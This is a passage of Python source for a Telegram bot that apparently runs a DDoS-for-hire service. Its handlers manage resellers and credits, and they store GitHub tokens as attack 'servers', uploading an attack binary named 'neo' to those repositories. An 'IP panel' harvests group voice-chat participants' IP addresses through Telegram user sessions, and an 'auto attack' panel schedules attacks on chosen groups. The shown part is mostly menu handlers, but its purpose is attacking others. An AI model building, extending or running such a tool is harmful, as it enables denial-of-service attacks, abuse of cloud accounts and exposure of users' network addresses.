        "│  ᴇxᴀᴍᴘʟᴇ:  `123456789`        │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup
    )


async def add_reseller_start(update: Update, user_id):
    """Start add reseller process"""
    if not is_owner(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "reseller_add_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  💰  ᴀᴅᴅ ʀᴇꜱᴇʟʟᴇʀ - ꜱᴛᴇᴘ 1/3 ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ:          │\n"
        "│                                │\n"
        "│  ᴇxᴀᴍᴘʟᴇ:  `123456789`        │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup
    )


async def remove_reseller_start(update: Update, user_id):
    """Start remove reseller process"""
    if not is_owner(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "reseller_remove_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  🗑️  ʀᴇᴍᴏᴠᴇ ʀᴇꜱᴇʟʟᴇʀ        ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ:          │\n"
        "│                                │\n"
        "│  ᴇxᴀᴍᴘʟᴇ:  `123456789`        │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup
    )


async def owner_list(update: Update, user_id):
    """Display owner list"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    owners_list = (
        "╔════════════════════════════════╗\n"
        "║  👑  ᴏᴡɴᴇʀꜱ ʟɪꜱᴛ            ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
    )
    
    for owner_id, owner_info in owners.items():
        username = owner_info.get('username', f'ᴏᴡɴᴇʀ_{owner_id}')
        is_primary = owner_info.get('is_primary', False)
        added_by = owner_info.get('added_by', 'ꜱʏꜱᴛᴇᴍ')
        owners_list += f"│  • `{owner_id}` - @{username:<12} │\n"
        if is_primary:
            owners_list += "│    👑 ᴘʀɪᴍᴀʀʏ              │\n"
        owners_list += f"│    ᴀᴅᴅᴇᴅ ʙʏ: `{added_by}`      │\n"

    owners_list += "└────────────────────────────────┘"
    
    await update.message.reply_text(owners_list)


async def reseller_list(update: Update, user_id):
    """Display reseller list"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    if not resellers:
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  📭  ɴᴏ ʀᴇꜱᴇʟʟᴇʀꜱ      ║\n"
            "╚══════════════════════════╝"
        )
        return

    resellers_list = (
        "╔════════════════════════════════╗\n"
        "║  💰  ʀᴇꜱᴇʟʟᴇʀꜱ ʟɪꜱᴛ         ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
    )
    
    for reseller_id, reseller_info in resellers.items():
        username = reseller_info.get('username', f'ʀᴇꜱᴇʟʟᴇʀ_{reseller_id}')
        credits = reseller_info.get('credits', 0)
        expiry = reseller_info.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                expiry = expiry_date
            except Exception:
                pass
        resellers_list += f"│  • `{reseller_id}` - @{username:<12} │\n"
        resellers_list += f"│    ᴄʀᴇᴅɪᴛꜱ: {credits:<3} | ᴇxᴘ: {expiry:<10} │\n"

    resellers_list += "└────────────────────────────────┘"
    
    await update.message.reply_text(resellers_list)


async def broadcast_start(update: Update, user_id):
    """Start broadcast process"""
    if not is_owner(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "broadcast_message"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  📢  ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴍᴇꜱꜱᴀɢᴇ    ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴛᴏ ʙᴇ    │\n"
        "│  ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴛᴏ ᴀʟʟ ᴜꜱᴇʀꜱ:    │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup
    )


async def upload_binary_start(update: Update, user_id):
    """Start binary upload process"""
    if not is_owner(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    if not github_tokens:
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
            "║  ❌  ɴᴏ ꜱᴇʀᴠᴇʀꜱ ᴀᴠᴀɪʟᴀʙʟᴇ ║\n"
            "╚══════════════════════════════╝\n\n"
            "ɴᴏ ꜱᴇʀᴠᴇʀꜱ ᴀᴅᴅᴇᴅ."
        )
        return

    temp_data[user_id] = {"step": "binary_upload"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  📤  ʙɪɴᴀʀʏ ᴜᴘʟᴏᴀᴅ          ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ʏᴏᴜʀ ʙɪɴᴀʀʏ ꜰɪʟᴇ...    │\n"
        "│                                │\n"
        "│  ɪᴛ ᴡɪʟʟ ʙᴇ ᴜᴘʟᴏᴀᴅᴇᴅ ᴛᴏ ᴀʟʟ │\n"
        "│  ɢɪᴛʜᴜʙ ʀᴇᴘᴏꜱ ᴀꜱ `neo` ꜰɪʟᴇ │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup
    )


# ==================== TOKEN MANAGEMENT HANDLERS ====================

async def add_token_start(update: Update, user_id):
    """Start add token process"""
    if not is_owner(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "token_add"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  ➕  ᴀᴅᴅ ᴛᴏᴋᴇɴ              ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ʏᴏᴜʀ ɢɪᴛʜᴜʙ ᴛᴏᴋᴇɴ:    │\n"
        "│                                │\n"
        "│  ᴇxᴀᴍᴘʟᴇ:  `ghp_xxxxxxxxxxxxx`│\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup
    )


async def list_tokens(update: Update, user_id):
    """Display all tokens/servers"""
    if not is_owner(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    if not github_tokens:
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
            "║  📭  ɴᴏ ᴛᴏᴋᴇɴꜱ ᴀᴅᴅᴇᴅ      ║\n"
            "╚══════════════════════════════╝"
        )
        return

    tokens_list = (
        "╔════════════════════════════════╗\n"
        "║  🔑  ꜱᴇʀᴠᴇʀꜱ ʟɪꜱᴛ           ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
    )
    
    for i, token_data in enumerate(github_tokens[:15], 1):
        tokens_list += f"│  {i:2}. 👤 `{token_data['username']}`        │\n"
        tokens_list += f"│      📁 `{token_data['repo']}`        │\n"
        tokens_list += "│                                │\n"

    tokens_list += (
        "├────────────────────────────────┤\n"
        f"│  📊 ᴛᴏᴛᴀʟ: {len(github_tokens)} ꜱᴇʀᴠᴇʀꜱ        │\n"
        "└────────────────────────────────┘"
    )
    
    await update.message.reply_text(tokens_list)


async def remove_token_start(update: Update, user_id):
    """Start remove token process"""
    if not is_owner(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    if not github_tokens:
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
            "║  📭  ɴᴏ ᴛᴏᴋᴇɴꜱ ᴛᴏ ʀᴇᴍᴏᴠᴇ  ║\n"
            "╚══════════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "token_remove"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  🗑️  ʀᴇᴍᴏᴠᴇ ᴛᴏᴋᴇɴ           ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        f"│  ꜱᴇɴᴅ ᴛʜᴇ ᴛᴏᴋᴇɴ ɴᴜᴍʙᴇʀ       │\n"
        f"│  (1-{len(github_tokens)}):            │\n"
        "│                                │\n"
        "│  ᴇxᴀᴍᴘʟᴇ:  `1`                │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup
    )


async def remove_expired_tokens(update: Update, user_id):
    """Remove expired/invalid tokens"""
    if not is_owner(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  🔄  ᴄʜᴇᴄᴋɪɴɢ ᴛᴏᴋᴇɴꜱ...     ║\n"
        "╚════════════════════════════════╝"
    )

    valid_tokens = []
    expired_tokens = []

    for token_data in github_tokens:
        try:
            # ✅ DeprecationWarning fix
            g = Github(auth=Auth.Token(token_data['token']))
            gh_user = g.get_user()
            _ = gh_user.login
            valid_tokens.append(token_data)
        except Exception:
            expired_tokens.append(token_data)

    if not expired_tokens:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ✅  ᴀʟʟ ᴛᴏᴋᴇɴꜱ ᴀʀᴇ ᴠᴀʟɪᴅ   ║\n"
            "╚════════════════════════════════╝"
        )
        return

    github_tokens.clear()
    github_tokens.extend(valid_tokens)
    save_github_tokens(github_tokens)

    expired_list = (
        "╔════════════════════════════════╗\n"
        "║  🗑️  ᴇxᴘɪʀᴇᴅ ᴛᴏᴋᴇɴꜱ ʀᴇᴍᴏᴠᴇᴅ  ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
    )
    
    for token in expired_tokens[:10]:
        expired_list += f"│  • `{token['username']}` - {token['repo']:<12} │\n"

    expired_list += (
        "├────────────────────────────────┤\n"
        f"│  ✅ ᴠᴀʟɪᴅ: {len(valid_tokens)} ᴛᴏᴋᴇɴꜱ        │\n"
        f"│  ❌ ʀᴇᴍᴏᴠᴇᴅ: {len(expired_tokens)} ᴛᴏᴋᴇɴꜱ      │\n"
        "└────────────────────────────────┘"
    )
    
    await update.message.reply_text(expired_list)


# ==================== HELP HANDLER ====================

async def help_handler(update: Update, user_id):
    """Display help information based on user role"""
    
    if is_owner(user_id) or is_admin(user_id):
        message = (
            "╔════════════════════════════════╗\n"
            "║  🆘  ʜᴇʟᴘ - ᴀᴠᴀɪʟᴀʙʟᴇ ꜰᴇᴀᴛᴜʀᴇꜱ  ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  📌  ꜰᴏʀ ᴀʟʟ ᴜꜱᴇʀꜱ:           │\n"
            "│  • 🚀 ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ           │\n"
            "│  • 📊 ᴄʜᴇᴄᴋ ꜱᴛᴀᴛᴜꜱ            │\n"
            "│  • 🛑 ꜱᴛᴏᴘ ᴀᴛᴛᴀᴄᴋ              │\n"
            "│  • 🔐 ᴍʏ ᴀᴄᴄᴇꜱꜱ               │\n"
            "├────────────────────────────────┤\n"
            "│  📌  ᴀᴅᴍɪɴ ꜰᴇᴀᴛᴜʀᴇꜱ:          │\n"
            "│  • 👥 ᴜꜱᴇʀ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ         │\n"
            "│  • ⚙️ ʙᴏᴛ ꜱᴇᴛᴛɪɴɢꜱ            │\n"
            "├────────────────────────────────┤\n"
            "│  📌  ᴏᴡɴᴇʀ ꜰᴇᴀᴛᴜʀᴇꜱ:          │\n"
            "│  • 👑 ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ             │\n"
            "│  • 🔑 ᴛᴏᴋᴇɴ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ        │\n"
            "├────────────────────────────────┤\n"
            "│  📞 ɴᴇᴇᴅ ʜᴇʟᴘ? ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ │\n"
            "└────────────────────────────────┘"
        )
        
    elif can_user_attack(user_id):
        message = (
            "╔════════════════════════════════╗\n"
            "║  🆘  ʜᴇʟᴘ - ᴀᴠᴀɪʟᴀʙʟᴇ ꜰᴇᴀᴛᴜʀᴇꜱ  ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  📌  ʏᴏᴜʀ ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅꜱ: │\n"
            "│  • 🚀 ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ           │\n"
            "│  • 📊 ᴄʜᴇᴄᴋ ꜱᴛᴀᴛᴜꜱ            │\n"
            "│  • 🛑 ꜱᴛᴏᴘ ᴀᴛᴛᴀᴄᴋ              │\n"
            "│  • 🔐 ᴍʏ ᴀᴄᴄᴇꜱꜱ               │\n"
            "├────────────────────────────────┤\n"
            "│  📞 ɴᴇᴇᴅ ʜᴇʟᴘ? ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ │\n"
            "└────────────────────────────────┘"
        )
        
    else:
        message = (
            "╔════════════════════════════════╗\n"
            "║  🆘  ʜᴇʟᴘ - ɢᴇᴛᴛɪɴɢ ᴀᴄᴄᴇꜱꜱ   ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  📌  ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇꜱꜱ:           │\n"
            "│  • ʀᴜɴ /ꜱᴛᴀʀᴛ ᴛᴏ ʀᴇQᴜᴇꜱᴛ     │\n"
            "│  • ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ꜰᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ │\n"
            "│  • ᴡᴀɪᴛ ꜰᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ          │\n"
            "├────────────────────────────────┤\n"
            f"│  🆔  ʏᴏᴜʀ ɪᴅ:  {user_id}               │\n"
            "├────────────────────────────────┤\n"
            "│  📞  ɴᴇᴇᴅ ʜᴇʟᴘ? ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ │\n"
            "└────────────────────────────────┘"
        )

    await update.message.reply_text(message)

# ═══════════════════════════════════════════════════════════
#                    IP PANEL HANDLERS
# ═══════════════════════════════════════════════════════════

async def show_ip_panel(update: Update, user_id):
    """Display IP Panel"""
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ")
        return

    if not PYROGRAM_AVAILABLE:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ᴘʏʀᴏɢʀᴀᴍ ᴍɪꜱꜱɪɴɢ      ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  ɪɴꜱᴛᴀʟʟ:  `pip install      │\n"
            "│            pyrogram tgcrypto`  │\n"
            "└────────────────────────────────┘"
        )
        return

    msg = (
        "╔════════════════════════════════╗\n"
        "║  📡  ɪᴘ ᴘᴀɴᴇʟ               ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        f"│  📁 ᴀᴄᴄᴏᴜɴᴛꜱ:  {len(ip_accounts):<15} │\n"
        f"│  🔥 ʟᴏᴀᴅᴇᴅ:    {len(ip_clients):<15} │\n"
        "│                                │\n"
        "│  ꜱᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:     │\n"
        "└────────────────────────────────┘"
    )
    await update.message.reply_text(msg, reply_markup=get_ip_panel_keyboard())


async def ip_add_session_start(update, user_id):
    """Start IP session add flow"""
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ")
        return

    if not PYROGRAM_AVAILABLE:
        await update.message.reply_text("❌ Pyrogram install nahi hai.")
        return

    temp_data[user_id] = {"step": "ip_add_session_name"}
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  ➕  ᴀᴅᴅ ꜱᴇꜱꜱɪᴏɴ - ꜱᴛᴇᴘ 1/3 ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ᴀ ꜱᴇꜱꜱɪᴏɴ ɴᴀᴍᴇ:      │\n"
        "│  (ᴀ-ᴢ, 0-9, _ , - ᴏɴʟʏ)        │\n"
        "│                                │\n"
        "│  ᴇxᴀᴍᴘʟᴇ:  `my_account`      │\n"
        "└────────────────────────────────┘",
        reply_markup=get_cancel_keyboard()
    )


async def ip_sessions_list(update, user_id):
    """Show saved sessions"""
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ")
        return

    if not ip_accounts:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  📭  ɴᴏ ꜱᴇꜱꜱɪᴏɴꜱ            ║\n"
            "╚════════════════════════════════╝"
        )
        return

    text = (
        "╔════════════════════════════════╗\n"
        "║  📁  ꜱᴀᴠᴇᴅ ꜱᴇꜱꜱɪᴏɴꜱ         ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
    )
    for i, (name, d) in enumerate(ip_accounts.items(), 1):
        fn = (d.get('first_name') or 'N/A')[:14]
        un = (d.get('username') or 'none')[:14]
        text += f"│  {i:2}. `{name}`\n"
        text += f"│      👤 {fn:<14} │\n"
        text += f"│      🆔 @{un:<13} │\n"
        text += "│                                │\n"

    text += (
        "├────────────────────────────────┤\n"
        f"│  📊 ᴛᴏᴛᴀʟ: {len(ip_accounts)} ꜱᴇꜱꜱɪᴏɴꜱ       │\n"
        "└────────────────────────────────┘"
    )
    await update.message.reply_text(text)


async def ip_get_ip_start(update, user_id):
    """Start IP extraction flow"""
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ")
        return

    if not ip_accounts:
        await update.message.reply_text(
            "❌ **ɴᴏ ꜱᴇꜱꜱɪᴏɴꜱ!** ᴘᴇʜʟᴇ `➕ ᴀᴅᴅ ꜱᴇꜱꜱɪᴏɴ` ᴋᴀʀᴏ."
        )
        return

    temp_data[user_id] = {"step": "ip_get_ip_chat"}
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  🌐  ɢᴇᴛ ᴠᴄ ɪᴘ               ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ɢʀᴏᴜᴘ ʟɪɴᴋ ᴏʀ ɪᴅ:    │\n"
        "│                                │\n"
        "│  ᴇxᴀᴍᴘʟᴇ:                      │\n"
        "│  `https://t.me/groupname`     │\n"
        "│  `-1001234567890`             │\n"
        "└────────────────────────────────┘",
        reply_markup=get_cancel_keyboard()
    )


async def ip_health_check(update, user_id):
    """Health check all loaded ip clients"""
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ")
        return

    if not ip_accounts:
        await update.message.reply_text("📭 No sessions to check.")
        return

    await update.message.reply_text("🩺 Checking sessions...")
    lines = []
    ok = slow = dead = 0

    for name in list(ip_accounts.keys()):
        try:
            uc = await get_ip_client(name)
            if not uc:
                lines.append(f"🔴 `{name}` — not loaded")
                dead += 1
                continue
            start = time.time()
            await uc.get_me()
            lat = round((time.time() - start) * 1000)
            if lat < 500:
                lines.append(f"🟢 `{name}` — {lat}ms")
                ok += 1
            else:
                lines.append(f"🟡 `{name}` — {lat}ms")
                slow += 1
        except Exception as e:
            lines.append(f"🔴 `{name}` — {type(e).__name__}")
            dead += 1

    text = (
        "╔════════════════════════════════╗\n"
        "║  🩺  ʜᴇᴀʟᴛʜ ʀᴇᴘᴏʀᴛ          ║\n"
        "╚════════════════════════════════╝\n"
        + "\n".join(lines)
        + f"\n\n🟢 {ok}  🟡 {slow}  🔴 {dead}"
    )
    await update.message.reply_text(text)


async def ip_remove_session_start(update, user_id):
    """Start IP session remove flow"""
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ")
        return

    if not ip_accounts:
        await update.message.reply_text("❌ ɴᴏ ꜱᴇꜱꜱɪᴏɴꜱ!")
        return

    temp_data[user_id] = {"step": "ip_remove_session_name"}
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  🗑️  ʀᴇᴍᴏᴠᴇ ꜱᴇꜱꜱɪᴏɴ         ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ᴛʜᴇ ꜱᴇꜱꜱɪᴏɴ ɴᴀᴍᴇ:     │\n"
        "└────────────────────────────────┘",
        reply_markup=get_cancel_keyboard()
    )

# ═══════════════════════════════════════════════════════════════════
#                 💀   A U T O   A T T A C K   H A N D L E R S   💀
# ═══════════════════════════════════════════════════════════════════

# ─────────────────────────────────────────────────────────────────
#  🎛️  M A I N   P A N E L
# ─────────────────────────────────────────────────────────────────
async def show_auto_attack_panel(update, user_id):
    """Open the auto-attack control panel."""
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ")
        return

    if not PYROGRAM_AVAILABLE:
        await update.message.reply_text("❌ Pyrogram install nahi hai.")
        return

    active = sum(1 for t in auto_attack_targets.values() if t.get("enabled", True))
    paused = len(auto_attack_targets) - active

    msg = (
        "╔════════════════════════════════╗\n"
        "║   💀  ᴀᴜᴛᴏ ᴘᴀɴᴇʟ  💀   ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  📁 ꜱᴇꜱꜱɪᴏɴꜱ:   {len(ip_accounts):<12}┃\n"
        f"┃  🔑 ᴛᴏᴋᴇɴꜱ:     {len(github_tokens):<12}┃\n"
        "┠────────────────────────────────┨\n"
        f"┃  🟢 ᴀᴄᴛɪᴠᴇ:     {active:<12}┃\n"
        f"┃  🔴 ᴘᴀᴜꜱᴇᴅ:     {paused:<12}┃\n"
        f"┃  📋 ᴛᴏᴛᴀʟ:      {len(auto_attack_targets):<12}┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    )
    await update.message.reply_text(msg, reply_markup=get_auto_attack_keyboard())


# ─────────────────────────────────────────────────────────────────
#  ➕  N E W   D E T E C T O R   (Step 1/1)
# ─────────────────────────────────────────────────────────────────
async def ip_auto_attack_start(update, user_id):
    """Begin detector-mode target setup."""
    if not is_owner(user_id):
        return

    if not ip_accounts or not github_tokens:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ⚠️  ꜱᴇᴛᴜᴘ ɪɴᴄᴏᴍᴘʟᴇᴛᴇ       ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  ✅ ᴀᴅᴅ ᴀᴛ ʟᴇᴀꜱᴛ 1 ꜱᴇꜱꜱɪᴏɴ   │\n"
            "│  ✅ ᴀᴅᴅ ᴀᴛ ʟᴇᴀꜱᴛ 1 ᴛᴏᴋᴇɴ     │\n"
            "└────────────────────────────────┘"
        )
        return

    temp_data[user_id] = {"step": "ip_auto_attack_chat"}
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  💀  ᴀᴜᴛᴏ ᴀᴛᴛᴀᴄᴋ ꜱᴇᴛᴜᴘ     ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  🎯 ᴍᴏᴅᴇ: 🔍 ᴅᴇᴛᴇᴄᴛᴏʀ       ┃\n"
        "┃                                ┃\n"
        "┃  📎 ꜱᴇɴᴅ ɢʀᴏᴜᴘ ʟɪɴᴋ ᴏʀ ɪᴅ   ┃\n"
        "┃                                ┃\n"
        "┃  ᴇxᴀᴍᴘʟᴇ:                      ┃\n"
        "┃  `https://t.me/+xxxxx`         ┃\n"
        "┃  `@groupname`                  ┃\n"
        "┃  `-1001234567890`              ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
        reply_markup=get_cancel_keyboard()
    )


# ─────────────────────────────────────────────────────────────────
#  ⏱️  N E W   T I M E R   (Step 1/3)
# ─────────────────────────────────────────────────────────────────
async def ip_auto_attack_timer_start(update, user_id):
    """Begin timer-mode target setup."""
    if not is_owner(user_id):
        return

    if not ip_accounts or not github_tokens:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ⚠️  ꜱᴇᴛᴜᴘ ɪɴᴄᴏᴍᴘʟᴇᴛᴇ       ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  ✅ ᴀᴅᴅ ᴀᴛ ʟᴇᴀꜱᴛ 1 ꜱᴇꜱꜱɪᴏɴ   │\n"
            "│  ✅ ᴀᴅᴅ ᴀᴛ ʟᴇᴀꜱᴛ 1 ᴛᴏᴋᴇɴ     │\n"
            "└────────────────────────────────┘"
        )
        return

    temp_data[user_id] = {"step": "ip_auto_timer_chat"}
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  ⏱️  ᴛɪᴍᴇʀ ᴍᴏᴅᴇ - ꜱᴛᴇᴘ 1/3   ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  🎯 ᴍᴏᴅᴇ: ⏱️ ᴛɪᴍᴇʀ            ┃\n"
        "┃                                ┃\n"
        "┃  📎 ꜱᴇɴᴅ ɢʀᴏᴜᴘ ʟɪɴᴋ ᴏʀ ɪᴅ   ┃\n"
        "┃                                ┃\n"
        "┃  ᴇxᴀᴍᴘʟᴇ:                      ┃\n"
        "┃  `https://t.me/+xxxxx`         ┃\n"
        "┃  `@groupname`                  ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
        reply_markup=get_cancel_keyboard()
    )


# ─────────────────────────────────────────────────────────────────
#  📋  A U T O   L I S T
# ─────────────────────────────────────────────────────────────────
async def ip_auto_attack_list(update, user_id):
    """Show all configured auto-attack targets — stylish, detailed, chunk-safe."""
    if not is_owner(user_id):
        return

    # ═══════════════════════════════════════════════════════
    #   📭  EMPTY STATE
    # ═══════════════════════════════════════════════════════
    if not auto_attack_targets:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  📭  ɴᴏ ᴀᴄᴛɪᴠᴇ ᴛᴀʀɢᴇᴛꜱ       ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  💡 ᴜꜱᴇ ➕ ᴀᴅᴅ ᴛᴀʀɢᴇᴛ ᴏʀ      ┃\n"
            "┃     ⏱️ ᴀᴅᴅ ᴛɪᴍᴇʀ ᴛᴏ ꜱᴛᴀʀᴛ.     ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    # ═══════════════════════════════════════════════════════
    #   📊  SUMMARY STATS
    # ═══════════════════════════════════════════════════════
    total     = len(auto_attack_targets)
    active    = sum(1 for t in auto_attack_targets.values() if t.get("enabled", True))
    paused    = total - active

    timer_ct  = sum(1 for t in auto_attack_targets.values() if t.get("mode") == "timer")
    detect_ct = total - timer_ct

    total_atk = sum(t.get("attack_count", 0) for t in auto_attack_targets.values())
    total_bn  = sum(len(t.get("banned_sessions", [])) for t in auto_attack_targets.values())

    header = (
        "╔════════════════════════════════╗\n"
